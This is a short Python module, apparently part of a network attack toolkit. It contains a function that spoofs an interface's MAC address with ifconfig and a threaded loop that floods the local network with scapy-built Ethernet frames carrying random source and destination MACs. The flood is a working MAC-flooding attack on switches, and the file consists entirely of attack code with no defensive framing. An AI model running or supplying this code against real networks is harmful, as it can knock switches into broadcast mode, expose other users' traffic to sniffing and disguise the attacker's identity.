from subprocess import call
from time import sleep

from utils.mac import generate_mac_random
from scapy.all import Ether, sendp, IP
import threading


def mac_spoofing(iface: str, mac: str):
    call(['ifconfig', iface, 'down'])
    call(['ifconfig', iface, 'hw', 'ether', mac])
    call(['ifconfig', iface, 'up'])


def mac_flooding_threading(iface: str):
    while True:
        mac_random = generate_mac_random()
        mac_dst = generate_mac_random()
        frame = Ether(dst=mac_dst, src=mac_random) / IP()
        sendp(frame, iface=iface, verbose=False)


def mac_flooding(iface: str):
    attack_flooding = threading.Thread(target=mac_flooding_threading, args=(iface,))
    attack_flooding.start()
    sleep(2)
